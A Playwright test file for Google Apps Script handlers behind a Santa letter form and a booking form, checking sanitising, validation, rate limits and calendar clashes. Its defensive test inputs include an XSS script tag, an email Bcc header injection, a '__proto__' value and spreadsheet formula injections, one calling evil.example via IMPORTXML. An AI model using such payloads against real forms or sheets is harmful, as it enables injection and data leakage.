// The form scripts in apps-script/ run on Google, so these tests load them into a sandbox with
// stand-ins for the Google services they call and post to them the way a browser or a bot would.
import { test, expect } from '@playwright/test';
import { readFileSync } from 'node:fs';
import vm from 'node:vm';

test.skip(({ browserName }) => browserName !== 'chromium', 'Plain script checks; one browser is enough.');

function load(file, { props = {}, busy = [] } = {}) {
    const sent = [];
    const rows = [];
    const cache = new Map();
    const context = {
        MailApp: { sendEmail: (message) => sent.push(message) },
        PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => props[k] ?? null }) },
        CacheService: { getScriptCache: () => ({ get: (k) => cache.get(k) ?? null, put: (k, v) => cache.set(k, v) }) },
        LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
        ContentService: {
            MimeType: { JSON: 'json' },
            createTextOutput: (text) => ({
                text,
                setMimeType() {
                    return this;
                },
            }),
        },
        CalendarApp: {
            getCalendarById: () =>
                busy.length
                    ? {
                          getTimeZone: () => 'America/Denver',
                          getEvents: () =>
                              busy.map(([s, e]) => ({
                                  isAllDayEvent: () => false,
                                  getStartTime: () => new Date(context.dayStart.getTime() + s * 60000),
                                  getEndTime: () => new Date(context.dayStart.getTime() + e * 60000),
                              })),
                      }
                    : null,
        },
        Utilities: { parseDate: (text) => (context.dayStart = new Date(text.replace(' ', 'T') + ':00')) },
        SpreadsheetApp: {
            openById: () => ({
                getSheetByName: () => ({ getLastRow: () => rows.length, appendRow: (row) => rows.push(row) }),
            }),
        },
    };
    vm.createContext(context);
    for (const name of ['common.gs', file]) vm.runInContext(readFileSync(`apps-script/${name}`, 'utf8'), context);
    const post = (parameter) => context.doPost({ parameter }).text;
    return { post, sent, rows, context };
}

const inAMonth = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString().slice(0, 10);

test.describe('letter.gs', () => {
    const props = { LETTER_RECIPIENTS: 'santa@example.com' };
    const letter = { name: 'Ava', email: 'mom@example.com', message: 'Dear Santa,\nI would love a bike.', website: '' };

    test('emails a letter with the grown-up as Reply-To', () => {
        const { post, sent } = load('letter.gs', { props });
        expect(post(letter)).toBe('ok');
        expect(sent).toHaveLength(1);
        expect(sent[0]).toMatchObject({ to: 'santa@example.com', replyTo: 'mom@example.com', subject: 'Letter to Santa from Ava' });
        expect(sent[0].body).toContain('Dear Santa,\nI would love a bike.');
    });

    test('strips anything but letters, digits and everyday punctuation from the letter', () => {
        const { post, sent } = load('letter.gs', { props });
        post({ ...letter, message: '<script>alert(1)</script> I want a 🐶 puppy!\u0007 =HYPERLINK("x")' });
        const body = sent[0].body;
        expect(body).not.toMatch(/[<>🐶=]/u);
        expect(body).not.toContain(String.fromCharCode(7));
        expect(body).toContain('scriptalert(1)/script I want a puppy! HYPERLINK("x")');
    });

    test('turns away bad names and emails, missing fields and the honeypot', () => {
        const { post, sent } = load('letter.gs', { props });
        expect(post({ ...letter, name: 'Ava<img>' })).toMatch(/^invalid/);
        expect(post({ ...letter, email: 'a@b.com, c@d.com' })).toMatch(/^invalid/);
        expect(post({ ...letter, email: 'mom@example.com\nBcc: x@y.com' })).toMatch(/^invalid/);
        expect(post({ ...letter, message: '🎄🎄🎄' })).toMatch(/^invalid/);
        expect(post({ ...letter, name: 'A'.repeat(41) })).toMatch(/^invalid/);
        expect(post({ ...letter, website: 'http://spam.example' })).toBe('ok');
        expect(sent).toHaveLength(0);
    });

    test('keeps names in any language', () => {
        const { post, sent } = load('letter.gs', { props });
        expect(post({ ...letter, name: "José O'Brien-Núñez" })).toBe('ok');
        expect(sent[0].subject).toBe("Letter to Santa from José O'Brien-Núñez");
    });

    test('allows 3 letters an hour from one address', () => {
        const { post, sent } = load('letter.gs', { props });
        for (let i = 0; i < 3; i++) expect(post(letter)).toBe('ok');
        expect(post(letter)).toBe('too many requests');
        expect(post({ ...letter, email: 'dad@example.com' })).toBe('ok');
        expect(sent).toHaveLength(4);
    });
});

test.describe('booking.gs', () => {
    const props = { PRIVATE_RECIPIENTS: 'hanna@example.com', PHOTO_RECIPIENTS: 'photos@example.com', SHEET_ID: 'sheet' };
    const booking = {
        formType: 'private-booking',
        name: 'Jamie Lee',
        phone: '(307) 555-0199',
        email: 'jamie@example.com',
        date: inAMonth,
        time: '10:30',
        eventType: 'Holiday party',
        place: 'Cody',
        kids: '12',
        elf: 'Yes, please',
        photo: 'No photos, please',
        notes: 'Back door, please.',
        website: '',
    };

    test('emails a valid request to the right people', () => {
        const { post, sent } = load('booking.gs', { props });
        expect(post(booking)).toBe('ok');
        expect(sent[0]).toMatchObject({ to: 'hanna@example.com', replyTo: 'jamie@example.com' });
        expect(sent[0].body).toContain('Number of kids: 12');
        const photo = {
            formType: 'photo-shoot',
            name: 'Jamie',
            phone: '3075550199',
            email: 'j@example.com',
            date: inAMonth,
            time: '09:00',
            people: '4',
        };
        expect(post(photo)).toBe('ok');
        expect(sent[1].to).toBe('photos@example.com');
    });

    test('turns away values the form could never send', () => {
        const { post, sent } = load('booking.gs', { props });
        const bad = {
            formType: '__proto__',
            eventType: 'Wedding',
            elf: 'yes',
            kids: '-1',
            phone: '555',
            date: '2026-02-30',
            time: '10:15',
            place: '<<<>>>',
        };
        for (const [key, value] of Object.entries(bad)) expect(post({ ...booking, [key]: value }), key).not.toBe('ok');
        expect(post({ ...booking, kids: '1e3' })).toMatch(/^invalid/);
        expect(post({ ...booking, date: '2020-01-01' })).toMatch(/^invalid/);
        expect(sent).toHaveLength(0);
    });

    test('ignores fields the form doesn’t have', () => {
        const { post, sent } = load('booking.gs', { props });
        post({ ...booking, bcc: 'x@example.com', subject: 'hi' });
        expect(sent[0].body).not.toContain('x@example.com');
        expect(Object.keys(sent[0]).sort()).toEqual(['body', 'name', 'replyTo', 'subject', 'to']);
    });

    test('logs to the sheet as plain text, never as formulas', () => {
        const { post, rows } = load('booking.gs', { props });
        post({ ...booking, place: '=IMPORTXML("https://evil.example","//a")', notes: '+1 more' });
        const row = rows.at(-1);
        // = isn't a safe character, so it's gone; + and - are, so those values are marked as text.
        expect(row).toContain('IMPORTXML("https://evil.example","//a")');
        expect(row).toContain("'+1 more");
        expect(row.filter((v) => typeof v === 'string' && /^[=+\-@]/.test(v))).toEqual([]);
    });

    test('flags a time that is already on the calendar', () => {
        const { post, sent } = load('booking.gs', { props: { ...props, CALENDAR_ID: 'cal' }, busy: [[600, 660]] });
        post(booking);
        expect(sent[0].subject).toMatch(/^\[Time already booked\]/);
    });
});
